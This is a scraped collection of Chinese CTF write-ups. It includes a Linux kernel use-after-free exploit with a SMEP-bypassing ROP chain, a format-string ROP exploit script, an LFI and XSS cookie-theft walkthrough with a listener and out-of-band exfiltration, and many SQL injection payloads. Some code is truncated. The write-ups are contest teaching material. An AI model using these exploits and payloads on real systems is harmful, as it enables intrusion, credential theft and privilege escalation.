.text:00000000000000F5 mov filp, cs:babydev_struct.device_buf .text:00000000000000FC test rdi, rdi .text:00000000000000FF jz short loc_125 rdi寄存器存放的就是buffer指针。 可以看到，指针指向的空间的值已经不是初始化时候覆盖的全0了。 当前目标缓冲区内已经由于释放导致很多内容不为0，这时候，我们同样可以通过read的方法读到其他地址，获取地址泄露的能力。 在test之后泄露出来了一些额外的值，因此可以通过read的方法来进行info leak。 0x02 Exploit 既然这片空间是释放的状态，那么我们就可以在这个空间覆盖对象，同时，我们可以通过对设备B的write/read操作，达到对这个内核对象的读写能力，ling提到了tty_struct结构体，这是Linux驱动通信一个非常重要的数据结构，关于tty_struct结构体的内容可以去网上搜到。 于是整个问题就比较明朗了，我们可以通过这个漏洞来制造一个hole，这个hole的大小可以通过ioctl控制，我们将其控制成tty_struct结构体的大小0x2e0，随后close关闭设备A，通过open(/dev/ptmx)的方法申请大量的tty_struct结构体，确保这个结构体能够占用到这个hole，之后通过对设备B调用write/read函数完成对tty_struct结构体的控制。 首先我们按照上面思路，编写一个简单的poc。 fd = open(\"/dev/babydev\",O_RDWR); fd1 = open(\"/dev/babydev\",O_RDWR); //init babydev_struct printf(\"Init buffer for tty_struct,%dn\",sizeof(tty)); ioctl(fd,COMMAND,0x2e0); ioctl(fd1,COMMAND,0x2e0); 当close(fd)之后，我们利用open的方法覆盖tty_struct，同时向tty_struct开头成员变量写入test数据，退出时会由于tty_struct开头成员变量magic的值被修改导致异常。 接下来，我们只需要利用0CTF中一道很有意思的内核题目KNOTE的思路，在tty_struct的tty_operations中构造一个fake oprations，关键是修改其中的ioctl指针，最后达成提权效果。 首先，我们需要利用设备B的read函数来获得占位tty_struct的头部结构，然后才是tty_operations。 当然，通过启动命令我们可以看到，系统开启了smep，我们需要构造一个rop chain来完成对cr4寄存器的修改，将cr4中smep的比特位置0，来关闭smep。 unsigned long rop_chain[] = { poprdiret, 0x6f0, // cr4 with smep disabled native_write_cr4, get_root_payload, swapgs, 0, // dummy iretq, get_shell, user_cs, user_rflags, base + 0x10000, user_ss}; 解决了SMEP，我们就能完成最后的提权了。至此，我们可以将整个利用过程按照如下方式完成，首先利用设备A和B，close设备A，释放buffer，同时设备B占用同一个buffer空间，用tty_struct对象占位，然后设备B的write/read函数可以完成对tty_struct的读写。 至此，我们要构造fake struct来控制rip。 我们通过覆盖tty_struct中的tty_operations，来将fake tty_operations的ioctl函数替换掉，改成stack pivot，之后我们调用ioctl函数的时候相当于去执行stack pivot，从而控制rip。 当然，这个ioctl的设备对象不能是设备B，而是需要tty_struct喷射时所使用的的设备对象，tty_struct的喷射使用open方法完成。 for(i=0;i由于tty_operations->ioctl被修改，转而去执行stack pivot，从而获得控制rip的能力，这样通过stack pivot，就可以进入我们rop chain了。 之后我们通过get root payload来完成提权。 root_payload(void) { commit_creds(prepare_kernel_cred(0)); } 由于这道题目的环境没有KASLR，所以内核地址都没有变化，可以直接写死，当然，如果内核地址有变化也没有关系，通过设备B的read方法可以读到内核地址，算出基址，再加上偏移，一样可以得到commit_cred和prepare_kernel_cred的地址。 最后通过get shell完成提权，获得root权限。 18.NotFormat 类型：PWN 分值：250分 明显的格式化，在print之后直接调用exit退出了。和0ctf的easyprintf有点类似，参考http://blog.dragonsector.pl/2017/03/0ctf-2017-easiestprintf-pwn-150.html。与easyprintf不同的是这个题目是静态编译的，程序中没有system函数，因此构造了一个裸的rop去获取shell。 from threading import Thread import operator from zio import * target = './NotFormat' target = ('123.59.71.3', 20020) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != '': io.writeline(d) def format_write(writes, index): printed = 0 payload = '' for where, what in sorted(writes.items(), key=operator.itemgetter(1)): delta = (what - printed) & 0xffff if delta > 0: if delta >16)&0xffff writes[2] = pop_rdi_ret&0xffff writes[3] = (pop_rdi_ret>>16)&0xffff writes[4] = (fake_rsp+0x18)&0xffff writes[5] = ((fake_rsp+0x18)>>16)&0xffff writes[6] = read_buff&0xffff writes[7] = (read_buff>>16)&0xffff d = format_write(writes, 13+6) print len(d) d += '%'+str(fake_rsp-0x20)+'s' d = d.ljust(13*8, 'a') d += l64(malloc_hook) + l64(malloc_hook+2) d += l64(fake_rsp) + l64(fake_rsp+2) d += l64(fake_rsp+8) + l64(fake_rsp+10) d += l64(fake_rsp+0x10) + l64(fake_rsp+0x12) print len(d) io.gdb_hint() io.read_until('!') io.writeline(d) pop_rax_ret = 0x00000000004C2358 pop_rdx_rsi_ret = 0x0000000000442c69 syscall = 0x000000000043EE45 rop = l64(pop_rdi_ret)+l64(fake_rsp+12*8) rop+= l64(pop_rdx_rsi_ret) + l64(0) + l64(0) rop+= l64(pop_rax_ret) + l64(0x3b) rop += l64(syscall) rop += '/bin/shx00' rop += '/bin/shx00' rop += '/bin/shx00' io.writeline(rop) interact(io) exp(target) 三、MISC 4.传感器1 类型：MISC 分值：100分 差分曼彻斯特 from Crypto.Util.number import * id1 = 0x8893CA58 msg1 = 0x3EAAAAA56A69AA55A95995A569AA95565556 msg2 = 0x3EAAAAA56A69AA556A965A5999596AA95656 print hex(msg1 ^ msg2).upper() s = bin(msg2)[6:] print s r=\"\" tmp = 0 for i in xrange(len(s)/2): c = s[i*2] if c == s[i*2 - 1]: r += '1' else: r += '0' print hex(int(r,2)).upper() 6.warmup 类型：MISC 分值：100分 看到一个莫名其妙的文件open_forum.png，猜测是已知明文，后来google搞不到原图，官方的hint 猜测是盲水印工具：https://github.com/chishaxie/BlindWaterMark python27 bwm.py decode fuli.png fuli2.png res.png 12.badhacker 类型：MISC 分值：200分 首先看到pcap中IRC交流 意思就是在这个服务器上找文件，然后找改动的地方，把行号排序计算md5 This server 就是irc服务器 扫描端口 发现 http://202.5.20.47:8923 这个服务是开的 这里有个脑洞，服务器不支持host为ip的请求，只能讲host改为其他的，如提示的misc.ichunqiu.com 所以，在操作系统Host表中添加DNS，将misc.ichunqiu.com解析成http://202.5.20.47:8923/ 然后对这个服务器进行目录爆破，爆出mysql.bak 这个文件有点意思，需要找改动的地方。脑洞就是在unix操作系统中的换行是n，而在windows中的换行是rn，所以，找改动的地方。找到3处，交了不对。 于是扩大搜索范围，搜索r，发现有8处 将其行号排序，然后计算md5即可。 两个脑洞，一个是服务器拒绝host为IP的请求，另一个是unix和windows换行符号。 13.传感器2 类型：MISC 分值：250分 对#0X02 4D 88 45 AB F3 41 19 除了最后一位是校验位，其他都是控制命令和ID号，直接CRC8就可以 更改88 45 AB F3为 再计算就可以了 上图是ID为88 45 AB F3的 15.embarrass 类型：MISC 分值：300分 四、Crypto 11.partial 类型：Crypto 分值：300分 Coppersmith Attack 已知部分p，其实给的有点多，给576bit的就足够了 n=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9 p=0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000 p_fake = p+0x10000000000000000000000000 pbits = 1024 kbits = pbits-576 pbar = p_fake & (2^pbits-2^kbits) print \"upper %d bits (of %d bits) is given\" % (pbits-kbits, pbits) PR. = PolynomialRing(Zmod(n)) f = x + pbar x0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root = n^0.4 print x0 + pbar flag{4_5ing1e_R00T_cAn_chang3_eVeryth1ng} 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-06-24 20:51:29 0 issues reported "},"articals/2019xihulunjian.html":{"url":"articals/2019xihulunjian.html","title":"2019西湖论剑预选赛","keywords":"","body":"2019西湖论剑预选赛 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 链接: https://pan.baidu.com/s/1B9Coqdmh8wYnYo3eW3MOMg 提取码: bagw 网上公开WP: https://mp.weixin.qq.com/s/rlSyABoulRKygPmwfcUuXA https://www.anquanke.com/post/id/176136/ https://www.jianshu.com/p/c14970447ddd https://blog.csdn.net/qq_41420747/article/details/89076214 本站备份WP： 感谢：冷逸、fIappy[暂时未联系到作者] Web 作者：冷逸 babyt3 题目地址：http://61.164.47.198:10000/ 打开地址，发现提示： include $_GET['file'] 目测为文件包含，尝试读index.php的源码， http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php 还原后如下： 发现提示，其实右击查看源代码也可以看到.. base64解码后得到dir.php 读dir.php http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=dir.php 得知该文件可以列目录，尝试列目录 http://61.164.47.198:10000/dir.php?dir=/ 这样得到ffffflag_1s_Her4文件 使用file读取，得到flag http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=/ffffflag_1s_Her4 Breakout 题目地址：http://61.164.47.198:10001/ 打开后是一个登录界面，随意输入账号密码，即可登录进去，登录后界面如下： 第一个子页面可以留言评论,第二个子页面是将某个链接发送给管理员,管理员会携带cookie查看该页面,第三个子页面是执行命令和清除留言,尝试直接输入命令执行,提示说要有管理员权限才可以执行命令.到这里,很显然这是一个xss漏洞盗取管理员cookie然后登录管理员账号去执行命令. 使用如下payload绕过过滤 然后在report哪里提交 http://61.164.47.198:10001/main.php 有个验证码，爆破脚本如下 import hashlib def md5(key): m = hashlib.md5() m.update(key.encode('utf-8')) return m.hexdigest() for i in range(1000000000): if md5(str(i))[0:6] == ' b0f446 ': print(i) break 自己服务器监听 nc -lvvp 8000 可得到cookie 然后执行命令，使用ceye外带flag 猜猜flag是什么 题目地址： http://61.164.47.198:10002/ dir扫描得到 发现.DS_Store 泄露 脱下来 发现e10adc3949ba59abbe56e057f20f883e目录 继续扫描，发现git文件 使用Githack下载后得到三个文件 BackupForMySite.zip index.php lengzhu.jpg 用明文攻击解开压缩包BackupForMySite.zip，得到里面的code 注：只能使用bindzip进行压缩，反正我7-zip压缩的失败 或者使用rbkcrack进行明文攻击 解开后得到code is 后面是一个随机串 带入首页得到一串数字 然后使用使用php_mt_seed：你的数字 然后访问/flag/得到的数字.txt 得到flag 二.Crypto： 作者：fIappy [暂时未联系到作者] 题目: 哈夫曼之谜题目链接:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752d3c1f20.zip&type=attach&feature=custom题目描述:打开压缩包后得到一个文本文件,内容如下 11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110 a:4 d:9 g:1 f:5 l:1 0:7 5:9 {:1 }:1 根据题目名哈夫曼之谜,很容易想到是哈夫曼编码与解码的问题题目分析:对于哈夫曼编码的介绍就不多说,每个计算机专业的同学应该上数据结构课都学过,具体可以参考百度科:https://baike.baidu.com/item/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81/1719730?fr=aladdin 对于这个题目,第一行的01串显然就是flag编码后的结果,被编码的元素是左边一列的字母,他们对应的权重在第二列,对于一个哈夫曼编码问题,首先需要根据元素的权重构建哈夫曼树,然后对要编码的字符串按照一定的算法进行编码,然后再按照一定的算法进行解码.这些算法我们不需要知道详细过程,做题时可完全没有必要自己实现一个哈夫曼编码,太费时间,所以我们可以参考网上实例代码进行修改即可 参考的哈夫曼编码代码的博客地址:https://blog.csdn.net/qq_40328281/article/details/80412359 代码分析:要修改的地方其实就是最大的编码长度maxn,text长度n,权重数据weight和text数组. #include \"pch.h\" #include const int maxvalue = 200; const int maxbit = 200; const int maxn = 200; #include \"stdio.h\" #include \"stdlib.h\" using namespace std; struct haffnode { char ch; int weight; int flag; int parent; int leftchild; int rightchild; }; struct code { int bit[maxn]; int start; int weight; char ch; }; void haffman(int weight[], char text[], int n, haffnode hafftree[]) { int j, m1, m2, x1, x2, i; for (i = 0; i 运行结果: 三.re 作者：fIappy [暂时未联系到作者] 1.junk_instruction 题目文件:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752e532f14.zip&type=attach&feature=custom 从题目名字看出,这是一个含有垃圾指令例如花指令的程序. 而且从文件图标来看,显然是一个mfc写的程序. 打开程序发现需要输入flag,然后点击check来检测是否正确.可以猜测是将我们的输入进行各种加密处理然后和程序中的某个字符串(可能是动态生成的)比较,得出是否输入正确. 通过xspy工具:https://github.com/lynnux/xspy/tree/master/xspydll 找到check按钮的处理函数: 查看该函数 从这个check函数的逻辑看,应该是402600对输入进行判断,下面2个if分支对应于输入正确和错误的弹窗.跟进402600,发现该函数后面又几段花指令,例如这个: call %+5直到下面的retn都是花指令,找到这几段类似的代码,全部nop掉即可. 然后f5反编译: v2 = (const WCHAR *)sub_401570(&a1); v17 = (void *)sub_4030A0(v2); v13 = v17; LOBYTE(v70) = 1; v3 = (void *)sub_401570(v17); sub_403000((int)&v60, v3); LOBYTE(v70) = 3; sub_4012A0(&v18); v19 = (char *)unknown_libname_1(&v60); v54 = v19; v16 = v19 + 1; v54 += strlen(v54); v14 = ++v54 - (v19 + 1); v12 = v54 - (v19 + 1); v68 = 0; memset(&v69, 0, 0x27u); strncpy(&v68, v19, v54 - (v19 + 1)); if ( sub_402AF0(&v68) ) // 判断输入长度 { v57 = 0; v59 = 0; LABEL_7: v58 = v59; } else { v63 = 1919252337;//这里是rc4密钥 v64 = 1769306484; v65 = 28783; v66 = 0; memset(&v67, 0, 0xF5u); v61 = 0; memset(&v62, 0, 0xFFu); v7 = 0; memset(&v8, 0, 0x1FFu); v53 = (const char *)&v63; v10 = (int *)((char *)&v63 + 1); v53 += strlen(v53); v9 = ++v53 - ((const char *)&v63 + 1); v6 = v53 - ((const char *)&v63 + 1); v5 = &v63; sub_402CA0(&v61); v56 = &v68; v15 = &v69; v56 += strlen(v56); v11 = ++v56 - &v69; sub_402E80(v20, &v61, &v68, v56 - &v69); for ( i = 31; i >= 0; --i ) { if ( *(&v68 + i) != *((char *)&savedregs + i + (_DWORD)&loc_4026B7 - 4204867) ) { v59 = 0; goto LABEL_7; } } v58 = 1; } LOBYTE(v70) = 0; sub_403060((int)&v60); v70 = -1; sub_4012A0(&a1); return v58; } 通过分析程序先将输入进行了逆序,再使用rc4加密. rc4数组初始化:该函数也是被花指令的,使用相同方法处理即可 void __cdecl sub_402CA0(_BYTE *a1, int a2, unsigned int a3) { char v3; // ST1B_1 int v4; // [esp+8h] [ebp-114h] signed int i; // [esp+10h] [ebp-10Ch] signed int j; // [esp+10h] [ebp-10Ch] char v7; // [esp+18h] [ebp-104h] char v8; // [esp+19h] [ebp-103h] v4 = 0; v7 = 0; memset(&v8, 0, 0xFFu); for ( i = 0; i 进行比较判断 加密函数:该函数也是被花指令的,使用相同方法处理即可 int __stdcall sub_402E80(int a1, int a2, unsigned int a3) { int result; // eax char v4; // ST1B_1 int v5; // [esp+Ch] [ebp-18h] unsigned int i; // [esp+10h] [ebp-14h] int v7; // [esp+14h] [ebp-10h] v7 = 0; v5 = 0; for ( i = 0; i 而check函数的这段正是用于比较的数组 最种解密如下: import base64 key = \"qwertyuiop\" res = [0xfa,0x45,0xd0,0x9e,0,0xc,0x9f,0x82,0x57,0x89,0xe5,0xf7,0xb0,0x64,0x76 ,0xdd,0xaf,0xff,0x7d,0x91,0x16,0xcb,0x3e,0x6e,0x7e,0x19,0xdd,0xc8,0x26,0xd0,0xd6,0x5b] res = res[::-1] tmp = \"\" for i in res: tmp += chr(i) tmp = base64.b64encode(tmp) print tmp ff = \"f250e3d75820847d427f3af11a783379\" flag = ['*']*32 for i in range(16): flag[i] = ff[31-i] flag[31-i] = ff[i] print \"flag{%s\"%(\"\".join(flag))+'}' W9bQJsjdGX5uPssWkX3/r912ZLD35YlXgp8MAJ7QRfo= flag{973387a11fa3f724d74802857d3e052f} 2.Testre 题目文件链接: https://xproadl.91ctf.com/userdownload?filename=1904055ca752e746df2.zip&type =attach&feature=custom ida打开文件,main函数如下 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { void *ptr; // ST10_8 __int64 v5; // [rsp+18h] [rbp-28h] char v6; // [rsp+20h] [rbp-20h] int v7; // [rsp+3Ch] [rbp-4h] v7 = 0; v5 = 256LL; sub_400D00((__int64)&v6, 0x11uLL); ptr = malloc(0x100uLL); sub_400700(ptr, &v5, (__int64)&v6, 0x10uLL); free(ptr); return 0LL; } 跟进sub_400D00,发现是个接受输入的函数 跟进sub_400700: for ( i = 0LL; i 这部分将一个字符串和输入进行了异或加密,但后面会发现,并没有用到 while ( v20 >= 6; v21 /= 58; v27 /= v9; if ( !j ) break; } ++v20; v18 = j; } 这个循环才是主菜,我们暂时不去详细分析算法过程,比较复杂,但是可以看到常量58,被模了一下和被除了一下.继续看下面 if ( *v30 > n + v17 - j ) { if ( v17 ) // 不会执行到这里面,又是干扰分析 { c = 61; memset(encode_input, '1', v17); memset(v26, c, v17); } v20 = v17; while ( j 到这里发现有2个数组,分别是 .rodata:0000000000400EB0 byte_400EB0 db '1' ; DATA XREF: sub_400700+446↑r .rodata:0000000000400EB1 a23456789abcdef db '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',0 .rodata:0000000000400EEB align 10h .rodata:0000000000400EF0 ; char byte_400EF0[] .rodata:0000000000400EF0 byte_400EF0 db 'A' ; DATA XREF: sub_400700+464↑r .rodata:0000000000400EF1 aBcdefghijklmno db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',0 显然一个是base64编码表,一个是base58编码表,最开始把base58编码表看成了是数字加所有字母,浪费大量时间分析. 仔细观察代码,其实进行base64编码的过程是针对v26,但是v26变量指向的内存完全没有和最后的比较产生关系,所以这都是干扰做题的 最后观察比较语句,提取出最终串:D9cS9N9iHjMLTdA8YSMRMp 对其进行base58解码就是flag: import base58 as bs bs.b58decode('D9cS9N9iHjMLTdA8YSMRMp') #output: base58_is_boring base58通过pip install base58即可安装 3.easyCpp 题目链接： https://xproadl.91ctf.com/userdownload?filename=1904055ca752e6ae1c5.zip&type =attach&feature=custom 这个要求对 c++的 stl 比较熟悉 直接来到main: for ( i = 0; i >::push_back(&our_input, &v25[4 * i]); } for ( j = 0; j >::push_back(&fib_list, &input_begin); } 接受输入和生成斐波那契数列 std::vector>::push_back(&v20, v25); v7 = std::back_inserter>>(&v20); input_end = std::vector>::end(&our_input); input_begin = std::vector>::begin(&our_input); v9 = __gnu_cxx::__normal_iterator>>::operator+(&input_begin, 1LL);// 对input每个元素加1 std::transform>>,std::back_insert_iterator>>,main::{lambda(int)#1}>( v9, input_end, v7, v25); std::vector>::vector(&v23, input_end, v10); std::vector>::end(&v20); std::vector>::begin(&v20); std::accumulate>>,std::vector>,main::{lambda(std::vector>,int)#2}>((unsigned __int64)&input_begin); std::vector>::operator=(&v21, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v23); if ( (unsigned __int8)std::operator!=>(&v21, &fib_list) )// 必须相同 { puts(\"You failed!\"); exit(0); } transform是把v9的每个元素通过匿名函数进行转换,结果存入v20 进入transform: v4 = (int *)__gnu_cxx::__normal_iterator>>::operator*(&input_begin_1); v11 = main::{lambda(int)#1}::operator() const((_DWORD **)&v29, *v4);// 把输入的vector和v29相加 v5 = std::back_insert_iterator>>::operator*(&v24_backinsert); std::back_insert_iterator>>::operator=(v5, &v11); __gnu_cxx::__normal_iterator>>::operator++(&input_begin_1); std::back_insert_iterator>>::operator++(&v24_backinsert); 再进入 main::{lambda(int)#1}::operator() const((_DWORD *)&v29, v4);: __int64 __fastcall main::{lambda(int)#1}::operator() const(_DWORD **a1, int a2) { return (unsigned int)(**a1 + a2); } 这下就知道这个就是把输入和输入的第一个元素相加 接着看std::accumulate,这个程序的std::accumulate和c++的不一样不知道是不是ida识别错误,打开看这个函数,内部还是有个匿名函数,静态分析比较复杂,我们通过动态调试来分析 根据 std::vector>::operator=(&v25, &input_begin); std::vector>::~vector(&input_begin); std::vector>::~vector(&v27); if ( (unsigned __int8)std::operator!=>(&v25, &fib_list) )// 必须相同 我们需要分析v25的内容,通过下断std::vector>::~vector(&input_begin);再查看v25: gef➤ x/10gx $rsp+0x90 0x7fffc6f61660: 0x0000000002007f10 0x0000000002007f50 0x7fffc6f61670: 0x0000000002007f50 0x0000000000000000 0x7fffc6f61680: 0x0000000000000000 0x0000000000000000 0x7fffc6f61690: 0x0000000000000000 0x0000000000000000 0x7fffc6f616a0: 0x0000000000000000 0x0000000000000000 地址为0x0000000002007f10, 再查看堆: …….] Chunk(addr=0x2007e30, size=0x50, flags=PREV_INUSE) [0x0000000002007e30 00 00 00 00 00 00 00 00 24 00 00 00 23 00 00 00 ……..$…#…] Chunk(addr=0x2007e80, size=0x50, flags=PREV_INUSE) [0x0000000002007e80 20 7e 00 02 00 00 00 00 24 00 00 00 23 00 00 00 ~……$…#…] Chunk(addr=0x2007ed0, size=0x40, flags=PREV_INUSE) [0x0000000002007ed0 00 00 00 00 00 00 00 00 23 00 00 00 22 00 00 00 ……..#…”…] Chunk(addr=0x2007f10, size=0x50, flags=PREV_INUSE) [0x0000000002007f10 27 00 00 00 26 00 00 00 25 00 00 00 24 00 00 00 gef➤ x/16wx 0x0000000002007f10 0x2007f10: 0x00000027 0x00000026 0x00000025 0x00000024 0x2007f20: 0x00000023 0x00000022 0x00000021 0x00000020 0x2007f30: 0x0000001f 0x0000001e 0x0000001d 0x0000001c 0x2007f40: 0x0000001b 0x0000001a 0x00000019 0x0000000c 发现这个是把输入进行了反向. 总结一下加密流程 1.接受16个数字输入 2.计算斐波那契数列前16项 3.把16个数字输入从第二个元素开始,都加上第一个元素 4.将3的结果反向 5.将4的结果和2的结果比较,完全相同则输入的是flag 解密脚本: a = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987] c = a[::-1] d = [987] for i in range(1,len(c)): d.append(c[i]-987) import pprint pprint.pprint(d) 输出: [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] getflag: from pwn import * p = process('./easyCpp') input_ = [987, -377, -610, -754, -843, -898, -932, -953, -966, -974, -979, -982, -984, -985, -986, -986] for i in input_: p.sendline(str(i)) p.interactive() 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-04-28 01:59:49 0 issues reported "},"articals/shiyanbar_web.html":{"url":"articals/shiyanbar_web.html","title":"实验吧web部分","keywords":"","body":"实验吧Web部分 题目类型： 类型 年份 难度 网上练习题 无 易 题目下载： http://www.shiyanbar.com/ctf/ 网上公开WP： https://www.cnblogs.com/sch01ar/p/7996159.html https://www.0x002.com/2019/百道CTF刷题记录(一)/ 本站备份WP: 作者：Yunen 简介 最近在刷CTF题，主攻Web，兼职Misc Shiyanbar 0x01 简单的登陆题 简单概括： 考点： %00截断正则 CBC字节翻转攻击 难度： 难 WP：https://blog.csdn.net/include_heqile/article/details/79942993 解题过程： F12查看响应头，发现返回tips访问test.php文件得到源代码： base64_decode('\".base64_encode($plain).\"') can't unserialize\"); $sql=\"select * from users limit \".$info['id'].\",0\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)>0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo 'Hello!'.$rows['username'].''; } else{ echo 'Hello!'; } }else{ die(\"ERROR!\"); } } } if(isset($_POST['id'])){ $id = (string)$_POST['id']; if(sqliCheck($id)) die(\"sql inject detected!\"); $info = array('id'=>$id); login($info); echo 'Hello!'; }else{ if(isset($_COOKIE[\"iv\"])&&isset($_COOKIE['cipher'])){ show_homepage(); }else{ echo ' Login Form input id to login '; } }?> 代码分析： sqliCheck函数负责过滤sql注入 get_random_iv 生成16位随机数(Asicc范围在0~255内)iv 漏洞原因：aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过) 0x02 后台登录 简单概括： 考点：md5()函数16位二进制格式绕过，md5(\"ffifdyop\",True)得到的加密字符串为'or'6(注：or '数字+字母' 等价于or true) 难度：易 WP：https://blog.csdn.net/qq_36791003/article/details/81746730 解题过程： 打开网页，右键查看源代码发现源码： 0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } --> 上网查了下，了解到md5($password,true)返回的是原始 16 字符二进制格式的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。经过简单的Fuzz,我们知道：字符串'or'6\"，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。 0x03 加了料的报错注入 简单概括： 考点：双参数注释绕过，=被过滤可用regexp 'xxx'和in (0xaaaa)代替 难度： 中 WP：https://www.jianshu.com/p/95f18a32ec7b 解题过程： 观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&password。sql语句如下： $sql=\"select * from users where username='$username' and password='$password'\"; 注意：此处可控的参数有两个。简单手工测试，发现过滤了#，and等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：exp(~(select * from(select user())a))成功爆出用户名。 最终我们的payload如下： username=a'/*&password=*/Or exp(~(select * from(select database())a))or'1 //查询当前数据库 username=a'/*&password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp 'error_based_hpf')a))or'1 //查询表名，此处由于=被过滤，我们使用regexp来绕过 username=a'/*&password=*/Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a))or'1 //查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。 username=a'/*&password=*/Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or'1 //获取flag 0x04 认真一点！ 简单概括： 考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注 难度：难 WP：https://blog.csdn.net/xingyyn78/article/details/79747404 解题过程： 打开网页，随便输入个数字，页面返回You are in...，输入在数字后加单引号，返回You are not in...。猜测此处考的是bool盲注，根据页面返回的内容判断真假。经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：oorr就好了。 id=aaa'oorr(1=1)='1 //返回You are in id=aaa'oorr(1=2)='1 //返回You are not in // 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句 // 即：false ∪ (条件一) = 条件一 我们先判断数据库长度： id=aaa'oorr(length(database())>1)='1 其次循环取数据库名进行判断： id=aaa'oorr(mid((select+database())from(1)foorr(1))='c')='1 //由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤 接着循环判断表名： id=aaa'oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))='a')='1 之后就不写了，与上边类似，写脚本跑就好。 0x05 你真的会PHP吗？ 简单概括： 考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：2147483647(2^31-1) 64位：9223372036854775807(2^63-1) 难度：中 WP：https://blog.csdn.net/JBlock/article/details/78745513 解题过程： 打开题目，发现返回头存在提示信息：打开链接获得源码： $value) { $value = trim($value); is_string($value) && $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i 代码流程：is_numeric[false] && $req['number']!=strval(intval($req['number']))[false]-> $value1!=$value2[false]-> is_palindrome_number($req[\"number\"])[true] 我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741>2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。 此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。 0x06 登陆一下好吗?? 简单概括： 考点：登录框万能密码 难度：中 WP：https://blog.csdn.net/h1012946585/article/details/79851884 解题过程： 打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用'='成功。 0x07 who are you? 简单概括： 考点：时间盲注，and case when () then () else () end绕过逗号过滤。 难度：中 WP：https://blog.csdn.net/wy_97/article/details/75643252 解题过程： 抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替： X-Forwarded-For: 127.0.0.1'and case when(length(database())>1)then(sleep(5))else(sleep(0))end and '1 剩下的就是写脚本慢慢跑了，此处略过。 0x08 因缺思汀的绕过 简单概括： 考点：gourp by xxx with rollup limit 1 offset x#【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】 难度：中 WP：https://blog.csdn.net/qq_35078631/article/details/54772798 解题过程： 右键源代码得到提示信息source.txt，打开得到源码。 '.\"\"; echo 